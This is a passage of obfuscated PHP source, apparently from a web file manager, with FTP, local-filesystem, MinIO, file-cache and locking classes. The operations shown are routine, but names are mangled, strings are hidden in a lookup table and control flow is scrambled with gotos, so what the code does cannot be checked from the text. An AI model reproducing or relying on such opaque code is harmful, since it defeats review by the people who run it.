E¢ºøÏË«æ; E¢ºøÏË«æ: if ($DΩ„ÒÙÏ€ñ !== null && $DΩ„ÒÙÏ€ñ !== !1) { return $DΩ„ÒÙÏ€ñ; } if (!$this->_isconn()) { return !1; } @ftp_chdir($this->connect, $f®ƒ¬˘°¬å[8]); goto EÎ ôÎø’î; EÎ ôÎø’î: $cÃÙä›âŒ∂ = @ftp_size($this->connect, $this->iconvSystem($f–ÛπœâÎ–)); if ($cÃÙä›âŒ∂ != -1) { $DΩ„ÒÙÏ€ñ = array($f®ƒ¬˘°¬å[77] => $cÃÙä›âŒ∂, $f®ƒ¬˘°¬å[29] => $f®ƒ¬˘°¬å[164]); } else { $bá—üä›Ê∏ = @ftp_chdir($this->connect, $this->iconvSystem($f–ÛπœâÎ–)); $DΩ„ÒÙÏ€ñ = $bá—üä›Ê∏ ? array($f®ƒ¬˘°¬å[77] => 0, $f®ƒ¬˘°¬å[29] => $f®ƒ¬˘°¬å[76]) : !1; } Cache::set($cæ§›õØ≤˘, $DΩ„ÒÙÏ€ñ, 0); goto FùÃŒ‚ﬁ»ª; FùÃŒ‚ﬁ»ª: return $DΩ„ÒÙÏ€ñ; goto Eâëè•ïﬂﬂ; Eâëè•ïﬂﬂ: } } class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($FúΩÓ√é≤º) { if (substr($FúΩÓ√é≤º, 0, 2) == $_SERVER[—Ω][1151]) { $FúΩÓ√é≤º = BASIC_PATH . substr($FúΩÓ√é≤º, 2); } return $FúΩÓ√é≤º; } public function iconvApp($a‰Ô¶ÿ¬“ö) { $C¯–ºåô…∂ =& $_SERVER[—Ω]; global $config; return $this->iconvTo($a‰Ô¶ÿ¬“ö, $config[$C¯–ºåô…∂[1149]], $config[$C¯–ºåô…∂[1148]]); } public function iconvSystem($f–’ˆ©ÍΩ≈) { $aà‹æóÒèπ =& $_SERVER[—Ω]; global $config; return $this->iconvTo($f–’ˆ©ÍΩ≈, $config[$aà‹æóÒèπ[1148]], $config[$aà‹æóÒèπ[1149]]); } public function getPathOuter($FŒœïÊü™ç) { goto F´’˜ß≠•ç; a≤¢◊∏˜¨â: if (substr($AÚ¶ﬂøê†ç, 0, 2) == $D€Æ‘´◊Œ“[1151]) { $AÚ¶ﬂøê†ç = BASIC_PATH . substr($AÚ¶ﬂøê†ç, 2); } if (substr($FŒœïÊü™ç, 0, 2) == $D€Æ‘´◊Œ“[1151]) { $FŒœïÊü™ç = BASIC_PATH . substr($FŒœïÊü™ç, 2); } $AÚ¶ﬂøê†ç = KodIO::clear($AÚ¶ﬂøê†ç); goto aÒ´çÑ÷êì; EÇæÉΩÁºò: return $this->pathDriver . $D€Æ‘´◊Œ“[8] . ltrim($FŒœïÊü™ç, $D€Æ‘´◊Œ“[8]); goto A˘Í˜Îå◊‡; aÒ´çÑ÷êì: $FŒœïÊü™ç = KodIO::clear($FŒœïÊü™ç); $FŒœïÊü™ç = substr($FŒœïÊü™ç, strlen($AÚ¶ﬂøê†ç)); if (empty($this->pathDriver)) { return $FŒœïÊü™ç; } goto EÇæÉΩÁºò; F´’˜ß≠•ç: $D€Æ‘´◊Œ“ =& $_SERVER[—Ω]; $AÚ¶ﬂøê†ç = $this->iconvApp($this->pathBase); $FŒœïÊü™ç = $this->iconvApp($FŒœïÊü™ç); goto a≤¢◊∏˜¨â; A˘Í˜Îå◊‡: } public function mkfile($dÑ°¿∫£∞¯, $aôÃÚ–á‚º = '', $CºŸÃ≤úÉì = REPEAT_RENAME) { $dÑ°¿∫£∞¯ = $this->iconvSystem($dÑ°¿∫£∞¯); @touch($dÑ°¿∫£∞¯); if ($aôÃÚ–á‚º) { file_put_contents($dÑ°¿∫£∞¯, $aôÃÚ–á‚º); } return is_file($dÑ°¿∫£∞¯) ? $this->getPathOuter($dÑ°¿∫£∞¯) : !1; } public function mkdir($EìÜë⁄π∆ﬂ, $CûÛﬂÑ“Ï≈ = REPEAT_SKIP) { $EìÜë⁄π∆ﬂ = $this->iconvSystem($EìÜë⁄π∆ﬂ); if (is_dir($EìÜë⁄π∆ﬂ)) { return $this->getPathOuter($EìÜë⁄π∆ﬂ); } @mkdir($EìÜë⁄π∆ﬂ, 511, !0); return is_dir($EìÜë⁄π∆ﬂ) ? $this->getPathOuter($EìÜë⁄π∆ﬂ) : !1; } public function copyFile($B°é˜Ö·í, $bøèÎü©Èµ) { $this->mkdir($this->pathFather($bøèÎü©Èµ)); $B°é˜Ö·í = $this->iconvSystem($B°é˜Ö·í); $bøèÎü©Èµ = $this->iconvSystem($bøèÎü©Èµ); $eÈ˘§ÆêûÉ = @copy($B°é˜Ö·í, $bøèÎü©Èµ); return $eÈ˘§ÆêûÉ ? $this->getPathOuter($bøèÎü©Èµ) : !1; } public function moveFile($e⁄›¡å·”ì, $CÃÙ–Ÿï¬•) { $this->mkdir($this->pathFather($CÃÙ–Ÿï¬•)); $e⁄›¡å·”ì = $this->iconvSystem($e⁄›¡å·”ì); $CÃÙ–Ÿï¬• = $this->iconvSystem($CÃÙ–Ÿï¬•); $aµ…∏√À∫Ó = intval(@rename($e⁄›¡å·”ì, $CÃÙ–Ÿï¬•)); if (!$aµ…∏√À∫Ó) { if ($aµ…∏√À∫Ó = intval(@copy($e⁄›¡å·”ì, $CÃÙ–Ÿï¬•))) { @unlink($e⁄›¡å·”ì); } } return $aµ…∏√À∫Ó ? $this->getPathOuter($CÃÙ–Ÿï¬•) : !1; } public function delFile($céÖŒÃÈÛË) { $céÖŒÃÈÛË = $this->iconvSystem($céÖŒÃÈÛË); if (!@unlink($céÖŒÃÈÛË)) { @chmod($céÖŒÃÈÛË, 511); if (!@unlink($céÖŒÃÈÛË)) { return !1; } } else { return !0; } } public function delFolder($b¬∆…Â¢∑ï) { goto dù©ÿ¢◊›ç; fÚ¿ô≥ç∏≠: if (!($FÚ‹Àü™—≥ = opendir($b¬∆…Â¢∑ï))) { return !1; } while (($EÕ„È‡ı€£ = readdir($FÚ‹Àü™—≥)) !== !1) { if ($EÕ„È‡ı€£ == $b≤±¢ê¥Ïó[93] || $EÕ„È‡ı€£ == $b≤±¢ê¥Ïó[1161]) { continue; } $d≠ΩôÇ Ÿö = $b¬∆…Â¢∑ï . $b≤±¢ê¥Ïó[8] . $EÕ„È‡ı€£; if (!is_dir($d≠ΩôÇ Ÿö)) { if (!unlink($d≠ΩôÇ Ÿö)) { chmod($d≠ΩôÇ Ÿö, 511); if (!unlink($d≠ΩôÇ Ÿö)) { return !1; } } } else { chmod($d≠ΩôÇ Ÿö, 511); $d≠ΩôÇ Ÿö = $this->iconvApp($d≠ΩôÇ Ÿö); if (!$this->delFolder($d≠ΩôÇ Ÿö)) { return !1; } } } closedir($FÚ‹Àü™—≥); goto F—öÒäöº»; dù©ÿ¢◊›ç: $b≤±¢ê¥Ïó =& $_SERVER[—Ω]; $b¬∆…Â¢∑ï = $this->iconvSystem($b¬∆…Â¢∑ï); if (!is_dir($b¬∆…Â¢∑ï)) { return !0; } goto fÚ¿ô≥ç∏≠; F—öÒäöº»: return rmdir($b¬∆…Â¢∑ï); goto a∂í–ºØÆù; a∂í–ºØÆù: } public function rename($eﬁ«ôåóˆ·, $AÇªÎÍà†ª) { goto Bæöó¡æµ¬; aääªòïÿá: $eﬁ≥ÇÚàƒ™ = @rename($eﬁ«ôåóˆ·, $EÙ¡ÀäÁö˜); $EÙ¡ÀäÁö˜ = $this->iconvApp($EÙ¡ÀäÁö˜); return $eﬁ≥ÇÚàƒ™ ? $this->getPathOuter($EÙ¡ÀäÁö˜) : !1; goto Cè≤ˆ›£æ€; Bæöó¡æµ¬: $AÑ…∫ìá‡ =& $_SERVER[—Ω]; $BÃ™Ìò º™ = $this->fileNameAuto($this->pathFather($eﬁ«ôåóˆ·), $AÇªÎÍà†ª); $BÃ™Ìò º™ = $this->iconvSystem($BÃ™Ìò º™); goto CÇ∑êï„é·; CÇ∑êï„é·: $eﬁ«ôåóˆ· = $this->iconvSystem($eﬁ«ôåóˆ·); $c≠§†û°üﬂ = $this->pathFather($eﬁ«ôåóˆ·); $EÙ¡ÀäÁö˜ = rtrim($c≠§†û°üﬂ, $AÑ…∫ìá‡[8]) . $AÑ…∫ìá‡[8] . $BÃ™Ìò º™; goto aääªòïÿá; Cè≤ˆ›£æ€: } public function size($Fÿœä∫ÂÖ√) { $Fÿœä∫ÂÖ√ = $this->iconvSystem($Fÿœä∫ÂÖ√); return (double) abs(sprintf($_SERVER[—Ω][1163], @filesize($Fÿœä∫ÂÖ√))); } public function info($CÑÖ ´øãÓ) { $CÑÖ ´øãÓ = $this->iconvSystem($CÑÖ ´øãÓ); if ($this->isFolder($CÑÖ ´øãÓ)) { return $this->folderInfo($CÑÖ ´øãÓ); } else { if ($this->isFile($CÑÖ ´øãÓ)) { return $this->fileInfo($CÑÖ ´øãÓ); } } return !1; } protected function infoChildren($aãäÂµº†Û, &$F‡ÑﬁÉÍÖÁ, $eô≤≠≥üüÖ = true) { $bÔ«ú—æíª =& $_SERVER[—Ω]; $aãäÂµº†Û = rtrim($aãäÂµº†Û, $bÔ«ú—æíª[8]) . $bÔ«ú—æíª[8]; if ($eô≤≠≥üüÖ) { check_abort(); $aãäÂµº†Û = $this->iconvSystem($aãäÂµº†Û); } if (!($E‘¨ãˆ”∑ò = @opendir($aãäÂµº†Û))) { return; } while (($D¨ﬁƒà¥™‰ = readdir($E‘¨ãˆ”∑ò)) !== !1) { if ($D¨ﬁƒà¥™‰ == $bÔ«ú—æíª[93] || $D¨ﬁƒà¥™‰ == $bÔ«ú—æíª[1161]) { continue; } $e‰çâïñæ = $aãäÂµº†Û . $D¨ﬁƒà¥™‰; if (is_file($e‰çâïñæ)) { $F‡ÑﬁÉÍÖÁ[$bÔ«ú—æíª[78]]++; $F‡ÑﬁÉÍÖÁ[$bÔ«ú—æíª[77]] += (double) abs(sprintf($bÔ«ú—æíª[1163], @filesize($e‰çâïñæ))); } else { $F‡ÑﬁÉÍÖÁ[$bÔ«ú—æíª[79]]++; $this->infoChildren($e‰çâïñæ, $F‡ÑﬁÉÍÖÁ, !1); } } closedir($E‘¨ãˆ”∑ò); } private function folderInfo($EïÜâ∑Ïû¬, $d∫Ì√å‚’‚ = false) { $C€áà≠≠õÇ =& $_SERVER[—Ω]; $EïÜâ∑Ïû¬ = rtrim($EïÜâ∑Ïû¬, $C€áà≠≠õÇ[8]) . $C€áà≠≠õÇ[8]; $Cá™îäë— = $this->iconvApp($this->pathThis($EïÜâ∑Ïû¬)); if ($d∫Ì√å‚’‚) { return array($C€áà≠≠õÇ[28] => $Cá™îäë—, $C€áà≠≠õÇ[75] => $this->getPathOuter($EïÜâ∑Ïû¬), $C€áà≠≠õÇ[29] => $C€áà≠≠õÇ[76]); } $A•æ®‡⁄≤¢ = array($C€áà≠≠õÇ[28] => $Cá™îäë—, $C€áà≠≠õÇ[75] => $this->getPathOuter($EïÜâ∑Ïû¬), $C€áà≠≠õÇ[29] => $C€áà≠≠õÇ[76], $C€áà≠≠õÇ[184] => @filectime($EïÜâ∑Ïû¬), $C€áà≠≠õÇ[107] => @filemtime($EïÜâ∑Ïû¬), $C€áà≠≠õÇ[1164] => @fileatime($EïÜâ∑Ïû¬), $C€áà≠≠õÇ[1158] => is_readable($EïÜâ∑Ïû¬), $C€áà≠≠õÇ[1159] => is_writable($EïÜâ∑Ïû¬), $C€áà≠≠õÇ[1165] => get_mode($EïÜâ∑Ïû¬)); return $A•æ®‡⁄≤¢; } private function fileInfo($a˘Ñ±∏∏¥¨, $DÖÙ∏ö÷÷ê = false) { $A™±¬íÇæ≠ =& $_SERVER[—Ω]; $EÁÀ™£∂≠Ê = $this->iconvApp($this->pathThis($a˘Ñ±∏∏¥¨)); if ($DÖÙ∏ö÷÷ê) { return array($A™±¬íÇæ≠[28] => $EÁÀ™£∂≠Ê, $A™±¬íÇæ≠[75] => $this->getPathOuter($a˘Ñ±∏∏¥¨), $A™±¬íÇæ≠[29] => $A™±¬íÇæ≠[164], $A™±¬íÇæ≠[77] => $this->size($a˘Ñ±∏∏¥¨), $A™±¬íÇæ≠[157] => $this->ext($EÁÀ™£∂≠Ê)); } $a œå“àøŸ = array($A™±¬íÇæ≠[28] => $EÁÀ™£∂≠Ê, $A™±¬íÇæ≠[75] => $this->getPathOuter($a˘Ñ±∏∏¥¨), $A™±¬íÇæ≠[29] => $A™±¬íÇæ≠[164], $A™±¬íÇæ≠[184] => @filectime($a˘Ñ±∏∏¥¨), $A™±¬íÇæ≠[107] => @filemtime($a˘Ñ±∏∏¥¨), $A™±¬íÇæ≠[1164] => @fileatime($a˘Ñ±∏∏¥¨), $A™±¬íÇæ≠[77] => $this->size($a˘Ñ±∏∏¥¨), $A™±¬íÇæ≠[157] => $this->ext($EÁÀ™£∂≠Ê), $A™±¬íÇæ≠[1158] => is_readable($a˘Ñ±∏∏¥¨), $A™±¬íÇæ≠[1159] => is_writable($a˘Ñ±∏∏¥¨), $A™±¬íÇæ≠[1165] => get_mode($a˘Ñ±∏∏¥¨)); return $a œå“àøŸ; } public function exist($Cõ…°ñﬂ÷ñ) { $Cõ…°ñﬂ÷ñ = $this->iconvSystem($Cõ…°ñﬂ÷ñ); return @file_exists($Cõ…°ñﬂ÷ñ); } public function isFile($Eçß€áëºŸ) { $Eçß€áëºŸ = $this->iconvSystem($Eçß€áëºŸ); return @is_file($Eçß€áëºŸ); } public function isFolder($FË±’êπÚß) { $FË±’êπÚß = $this->iconvSystem($FË±’êπÚß); return @is_dir($FË±’êπÚß); } public function listPath($aÚÉ≠ƒëÁª, $EÏµì‡ùú = false) { goto Cçã¥ÌÙ≥; Cçã¥ÌÙ≥: $aÍÆΩÍÌº© =& $_SERVER[—Ω]; $aÚÉ≠ƒëÁª = $this->iconvSystem($aÚÉ≠ƒëÁª); $aÚÉ≠ƒëÁª = rtrim($aÚÉ≠ƒëÁª, $aÍÆΩÍÌº©[8]) . $aÍÆΩÍÌº©[8]; goto F≤ã√÷ˆÀÆ; F≤ã√÷ˆÀÆ: $EŸè©©ıìﬁ = array($aÍÆΩÍÌº©[74] => array(), $aÍÆΩÍÌº©[73] => array()); if (!($aÌ§ÉØôêò = @opendir($aÚÉ≠ƒëÁª))) { return $EŸè©©ıìﬁ; } while (($AúàñÚ·—œ = readdir($aÌ§ÉØôêò)) !== !1) { if ($AúàñÚ·—œ == $aÍÆΩÍÌº©[93] || $AúàñÚ·—œ == $aÍÆΩÍÌº©[1161]) { continue; } $d≈Ù›ÃôÿÍ = $aÚÉ≠ƒëÁª . $AúàñÚ·—œ; if (is_file($d≈Ù›ÃôÿÍ)) { $EŸè©©ıìﬁ[$aÍÆΩÍÌº©[73]][] = $this->fileInfo($d≈Ù›ÃôÿÍ, $EÏµì‡ùú); } else { $EŸè©©ıìﬁ[$aÍÆΩÍÌº©[74]][] = $this->folderInfo($d≈Ù›ÃôÿÍ, $EÏµì‡ùú); } } goto cã†œäÌŒÌ; cã†œäÌŒÌ: closedir($aÌ§ÉØôêò); return $EŸè©©ıìﬁ; goto bªª“§Õ‚à; bªª“§Õ‚à: } public function listAll($DÔéÇäØ»Ì, &$eÙƒâ¶–ÚÛ = array()) { goto fé∆Ò≤ŒÉÀ; dœ∑”—ŒßÏ: return $eÙƒâ¶–ÚÛ; goto Aæ∞ÚΩ„Í◊; fé∆Ò≤ŒÉÀ: $FÒÜ˘¿€‰ò =& $_SERVER[—Ω]; $DÔéÇäØ»Ì = $this->iconvSystem($DÔéÇäØ»Ì); $DÔéÇäØ»Ì = rtrim($DÔéÇäØ»Ì, $FÒÜ˘¿€‰ò[8]) . $FÒÜ˘¿€‰ò[8]; goto c´ÿƒ∫Òëº; c´ÿƒ∫Òëº: if (!($eâËï¿øâÚ = @opendir($DÔéÇäØ»Ì))) { return $eÙƒâ¶–ÚÛ; } while (($aÂÀóéÜ∆à = readdir($eâËï¿øâÚ)) !== !1) { if ($aÂÀóéÜ∆à == $FÒÜ˘¿€‰ò[93] || $aÂÀóéÜ∆à == $FÒÜ˘¿€‰ò[1161]) { continue; } $e»ëÙêÀè∂ = $DÔéÇäØ»Ì . $aÂÀóéÜ∆à; if (is_dir($e»ëÙêÀè∂)) { $eÙƒâ¶–ÚÛ[] = array($FÒÜ˘¿€‰ò[75] => $e»ëÙêÀè∂ . $FÒÜ˘¿€‰ò[8], $FÒÜ˘¿€‰ò[76] => 1, $FÒÜ˘¿€‰ò[77] => 0); $this->listAll($e»ëÙêÀè∂, $eÙƒâ¶–ÚÛ); } else { $eÙƒâ¶–ÚÛ[] = array($FÒÜ˘¿€‰ò[75] => $e»ëÙêÀè∂, $FÒÜ˘¿€‰ò[76] => 0, $FÒÜ˘¿€‰ò[77] => $this->size($e»ëÙêÀè∂)); } } closedir($eâËï¿øâÚ); goto dœ∑”—ŒßÏ; Aæ∞ÚΩ„Í◊: } public function has($FûÔÌâÚ«¿, $dï≠Ù€«ñÙ = false, $aç€ß¡∫Ì— = true) { goto dËË§èè◊–; dËË§èè◊–: $DëßÈñﬂ»√ =& $_SERVER[—Ω]; $FûÔÌâÚ«¿ = $this->iconvSystem($FûÔÌâÚ«¿); $FûÔÌâÚ«¿ = rtrim($FûÔÌâÚ«¿, $DëßÈñﬂ»√[8]) . $DëßÈñﬂ»√[8]; goto CÑ¨»âËø®; fÈå‡§±¿ƒ: return !1; goto f¿úúÇ®óÕ; CÑ¨»âËø®: if (!($aΩÑ§÷¡ÏÌ = @opendir($FûÔÌâÚ«¿))) { return !1; } $eçÔã—Ü Ü = 0; $CÛáÑøùÇ⁄ = 0; goto cËòŒóèı¨; cËòŒóèı¨: while (($e∏Îˆë˜ÌÙ = readdir($aΩÑ§÷¡ÏÌ)) !== !1) { if ($e∏Îˆë˜ÌÙ == $DëßÈñﬂ»√[93] || $e∏Îˆë˜ÌÙ == $DëßÈñﬂ»√[1161]) { continue; } $c⁄øˆ÷àü“ = $FûÔÌâÚ«¿ . $e∏Îˆë˜ÌÙ; if ($dï≠Ù€«ñÙ) { if (@is_file($c⁄øˆ÷àü“)) { $eçÔã—Ü Ü++; } else { $CÛáÑøùÇ⁄++; } continue; } if ($aç€ß¡∫Ì—) { if (@is_file($c⁄øˆ÷àü“)) { return !0; } } else { if (@is_dir($c⁄øˆ÷àü“ . $DëßÈñﬂ»√[8])) { return !0; } } } closedir($aΩÑ§÷¡ÏÌ); if ($dï≠Ù€«ñÙ) { return array($DëßÈñﬂ»√[188] => $eçÔã—Ü Ü, $DëßÈñﬂ»√[189] => $CÛáÑøùÇ⁄); } goto fÈå‡§±¿ƒ; f¿úúÇ®óÕ: } public function hashSimple($cáÍÑÕÀ˘ç) { goto EÀ’Îï°é≥; Fç«…·ôﬁû: $dÿ¥•®∑Çó = $this->size($cáÍÑÕÀ˘ç); $dóÃÙﬁÆì = 200; $EﬂäÎÀÂ£ô = 50; goto E‰ê¨ƒΩá¶; dêÌÖß ÈÛ: $Càæ¨Ô¢Ú˘ = fopen($cáÍÑÕÀ˘ç, $eÃÊ÷õ∑ıª[1166]); if (!$Càæ¨Ô¢Ú˘) { return $fﬂ·πèòÃﬁ; } for ($eí˜ëäﬁ¯‹ = 0; $eí˜ëäﬁ¯‹ < $EﬂäÎÀÂ£ô; $eí˜ëäﬁ¯‹++) { fseek($Càæ¨Ô¢Ú˘, $AéÓöÀ∫ßË * $eí˜ëäﬁ¯‹); $fﬂ·πèòÃﬁ .= fread($Càæ¨Ô¢Ú˘, $dóÃÙﬁÆì); } goto a¿áïåõı£; e∏‰ë¬‡Òƒ: return md5($fﬂ·πèòÃﬁ) . $dÿ¥•®∑Çó; goto DÿÕ•–®ßó; E‰ê¨ƒΩá¶: if ($dÿ¥•®∑Çó <= $dóÃÙﬁÆì * $EﬂäÎÀÂ£ô) { return $this->hashMd5($cáÍÑÕÀ˘ç) . $dÿ¥•®∑Çó; } $fﬂ·πèòÃﬁ = $eÃÊ÷õ∑ıª[33]; $AéÓöÀ∫ßË = intval($dÿ¥•®∑Çó / $EﬂäÎÀÂ£ô); goto dêÌÖß ÈÛ; a¿áïåõı£: fseek($Càæ¨Ô¢Ú˘, $dÿ¥•®∑Çó - $dóÃÙﬁÆì); $fﬂ·πèòÃﬁ .= fread($Càæ¨Ô¢Ú˘, $dóÃÙﬁÆì); fclose($Càæ¨Ô¢Ú˘); goto e∏‰ë¬‡Òƒ; EÀ’Îï°é≥: $eÃÊ÷õ∑ıª =& $_SERVER[—Ω]; if (!$cáÍÑÕÀ˘ç) { return md5($eÃÊ÷õ∑ıª[33]); } $cáÍÑÕÀ˘ç = $this->iconvSystem($cáÍÑÕÀ˘ç); goto Fç«…·ôﬁû; DÿÕ•–®ßó: } public function getContent($DÛãïƒœπΩ) { $DÛãïƒœπΩ = $this->iconvSystem($DÛãïƒœπΩ); return file_get_contents($DÛãïƒœπΩ); } public function setContent($E¶µ∫»Æ¨à, $B©ïêÎ§ËÇ = '') { $E¶µ∫»Æ¨à = $this->iconvSystem($E¶µ∫»Æ¨à); @file_put_contents($E¶µ∫»Æ¨à, $B©ïêÎ§ËÇ, LOCK_EX); clearstatcache(); return strlen($B©ïêÎ§ËÇ) == filesize($E¶µ∫»Æ¨à); } public function fileSubstr($döç∏∑Ø˜ê, $F»áê‘ø£‹ = 0, $eÛŒõ“¬π® = false) { goto CËãÓÇÒíœ; CËãÓÇÒíœ: $d¬ûÂØıâœ =& $_SERVER[—Ω]; $döç∏∑Ø˜ê = $this->iconvSystem($döç∏∑Ø˜ê); if ($eÛŒõ“¬π® === !1) { $eÛŒõ“¬π® = $this->size($döç∏∑Ø˜ê); } goto dÀ∂ÓæúÑ©; dÀ∂ÓæúÑ©: if ($eÛŒõ“¬π® <= 0) { return $d¬ûÂØıâœ[33]; } $E∆Ÿï∑¯£ê = fopen($döç∏∑Ø˜ê, $d¬ûÂØıâœ[1166]); if (!$E∆Ÿï∑¯£ê) { return !1; } goto câå˜≈æ∫¡; B¶‚ÙÎÑ§ù: return $Bé∏ÚÖß—ı; goto a¨˘¡öóﬁ±; câå˜≈æ∫¡: fseek($E∆Ÿï∑¯£ê, $F»áê‘ø£‹); $Bé∏ÚÖß—ı = fread($E∆Ÿï∑¯£ê, $eÛŒõ“¬π®); fclose($E∆Ÿï∑¯£ê); goto B¶‚ÙÎÑ§ù; a¨˘¡öóﬁ±: } public function upload($cöã≥‘ô£î, $fÚòªØΩõÉ, $f™ËØòŒ¯è = false, $D∏”…∂›ã£ = REPEAT_REPLACE) { $EΩü›ÆﬂäÜ = $this->copyFile($fÚòªØΩõÉ, $cöã≥‘ô£î); return $EΩü›ÆﬂäÜ ? $this->getPathOuter($cöã≥‘ô£î) : !1; } public function download($a‚ÿ˜•ÇçÉ, $Fÿ¬÷“ÉØà) { return $this->iconvSystem($a‚ÿ˜•ÇçÉ); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($BªÑ—π‹ÏΩ) { parent::__construct($BªÑ—π‹ÏΩ); $this->signatureVersion($_SERVER[—Ω][197]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto EºÖàÖäùπ; bˆÓÕ›øõ«: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($e”Ú®£ßﬁÎ, $Cªµ¨ŸÑûπ) { $E≥ª≠ùÕπÊ =& $_SERVER[—Ω]; $this->cachePath = $e”Ú®£ßﬁÎ[$E≥ª≠ùÕπÊ[75]]; $this->prefix = $E≥ª≠ùÕπÊ[770]; $this->cacheTime = $Cªµ¨ŸÑûπ; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($F≈ÆëüµñÙ) { $b§∂¨É∫¥ß =& $_SERVER[—Ω]; $F≈ÆëüµñÙ = str_replace(array($b§∂¨É∫¥ß[771], $b§∂¨É∫¥ß[95], $b§∂¨É∫¥ß[69]), $b§∂¨É∫¥ß[772], $F≈ÆëüµñÙ); return $this->cachePath . $b§∂¨É∫¥ß[773] . $F≈ÆëüµñÙ . $b§∂¨É∫¥ß[774]; } public function set($AãàÀõîÜÍ, $bÀ¡ΩÁìùÂ, $cπÒ∫ëê–¢ = false) { $D ∆¶ı‹®Ñ = $this->getFile($AãàÀõîÜÍ); if (file_put_contents($D ∆¶ı‹®Ñ, $this->prefix . $bÀ¡ΩÁìùÂ, LOCK_EX)) { return !0; } @unlink($D ∆¶ı‹®Ñ); return !1; } public function get($EŒôı©ﬂ–í) { $c§™≠‡ÆÂô = $this->getFile($EŒôı©ﬂ–í); if (file_exists($c§™≠‡ÆÂô) && filemtime($c§™≠‡ÆÂô) < time() - $this->cacheTime) { @unlink($c§™≠‡ÆÂô); return !1; } $FñäùÏàÏ¿ = @file_get_contents($c§™≠‡ÆÂô); return substr($FñäùÏàÏ¿, strlen($this->prefix)); } public function remove($DπÂ•∫„´ç) { $bÍÙé∫ª‰£ = $this->getFile($DπÂ•∫„´ç); return @unlink($bÍÙé∫ª‰£); } public function deleteAll() { $E≠•èÂÜà£ =& $_SERVER[—Ω]; $F™™´Ô¬Ñ· = scandir($this->cachePath); foreach ($F™™´Ô¬Ñ· as $AéÙùàòÖπ) { $aòﬂëØ∆¯÷ = $this->cachePath . $AéÙùàòÖπ; if (strpos($aòﬂëØ∆¯÷, $E≠•èÂÜà£[774]) && strpos($aòﬂëØ∆¯÷, $E≠•èÂÜà£[775])) { @unlink($aòﬂëØ∆¯÷); } } } public function clearTimeout() { $bƒÏÇî ˆﬂ =& $_SERVER[—Ω]; $d†≈æ≤Á¨È = scandir($this->cachePath); foreach ($d†≈æ≤Á¨È as $d±«çò€•ã) { $cÒ»ä∏…„Ñ = $this->cachePath . $d±«çò€•ã; if (strpos($cÒ»ä∏…„Ñ, $bƒÏÇî ˆﬂ[774]) && strpos($cÒ»ä∏…„Ñ, $bƒÏÇî ˆﬂ[775]) && filemtime($cÒ»ä∏…„Ñ) < time() - $this->cacheTime) { @unlink($cÒ»ä∏…„Ñ); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto aØ‚ÒÍà∂ñ; aØ‚ÒÍà∂ñ: $FèÂ‹ëèŸï =& $_SERVER[—Ω]; if (self::$handle) { return self::$handle; } $Cëêã ö°˜ = $GLOBALS[$FèÂ‹ëèŸï[6]][$FèÂ‹ëèŸï[334]]; goto d†îóÿ‹Œ—; d†îóÿ‹Œ—: self::$timeout = $Cëêã ö°˜[$FèÂ‹ëèŸï[776]] ? $Cëêã ö°˜[$FèÂ‹ëèŸï[776]] : 10; $e…úùÀ˘™ú = _get($GLOBALS[$FèÂ‹ëèŸï[6]], $FèÂ‹ëèŸï[777]); $E¡Ïêåù†Ã = $Cëêã ö°˜[$FèÂ‹ëèŸï[763]] ? $Cëêã ö°˜[$FèÂ‹ëèŸï[763]] : $FèÂ‹ëèŸï[164]; goto dŸ§Ï≥è é; dŸ§Ï≥è é: if ($E¡Ïêåù†Ã == $FèÂ‹ëèŸï[17] && $e…úùÀ˘™ú == $FèÂ‹ëèŸï[9]) { $E¡Ïêåù†Ã = $FèÂ‹ëèŸï[164]; } switch ($E¡Ïêåù†Ã) { case $FèÂ‹ëèŸï[766]: self::$handle = new CacheLockRedis(); break; case $FèÂ‹ëèŸï[767]: self::$handle = new CacheLockMemcached(); break; case $FèÂ‹ëèŸï[17]: self::$handle = new CacheLockDatabase(); break; case $FèÂ‹ëèŸï[164]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto FÜ√ƒì¬Êˆ; FÜ√ƒì¬Êˆ: } private static function key($F¶„‹•≈òë) { return $_SERVER[—Ω][778] . Cache::key($F¶„‹•≈òë); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($bØÓ◊Ö€üΩ = '') { self::$errorMsg = $bØÓ◊Ö€üΩ; } public static function lockGlobal($bﬂ€∫¨ÍóΩ, $F¢õ¬ˆõßì) { return self::lock($bﬂ€∫¨ÍóΩ, $F¢õ¬ˆõßì, !0); } public static function lock($Cä˜∑´ò©∑, $FÛ°ﬂ”≈”ö = false, $CÜ∏÷ùåØµ = false) { goto AƒØ û˜âÀ; F≈ÿÙê˜ü˘: $FÛ°ﬂ”≈”ö = $FÛ°ﬂ”≈”ö ? $FÛ°ﬂ”≈”ö : self::$timeout; $a‰Î≈ºé“è = $Aï’í≈∑†à->lock($EﬂçÙ¡æ”Æ, $FÛ°ﬂ”≈”ö); if (!$a‰Î≈ºé“è) { $côÕÛÒ÷‡´ = $B‡üê´œæÜ[779] . $FÛ°ﬂ”≈”ö . $B‡üê´œæÜ[67] . self::$errorMsg . $B‡üê´œæÜ[67] . get_caller_msg(); $D¯„ÓÀ∑ëÚ = "\x4c\x6f\143\153\40\x61\x63\x74\151\157\x6e\72\40{$EﬂçÙ¡æ”Æ}\40\x74\151\155\145\x6f\165\164\54\157\x76\145\162\40{$FÛ°ﬂ”≈”ö}\40\x73"; $D¯„ÓÀ∑ëÚ = self::$errorMsg ? self::$errorMsg : $fá´˘‘¨à©; write_log($côÕÛÒ÷‡´, $B‡üê´œæÜ[780]); show_json($D¯„ÓÀ∑ëÚ, !1); } goto b‰òÍÎ∆ÑÓ; b‰òÍÎ∆ÑÓ: if (!$CÜ∏÷ùåØµ) { self::$lockItem[$EﬂçÙ¡æ”Æ] = !0; } return $a‰Î≈ºé“è; goto fú˜§Ñ¬ï¶; AƒØ û˜âÀ: $B‡üê´œæÜ =& $_SERVER[—Ω]; $Aï’í≈∑†à = self::init(); $EﬂçÙ¡æ”Æ = self::key($Cä˜∑´ò©∑); goto F≈ÿÙê˜ü˘; fú˜§Ñ¬ï¶: } public static function lockGet($f±îÎ‚«êπ) { $F‘îô‚·’± = self::key($f±îÎ‚«êπ); if 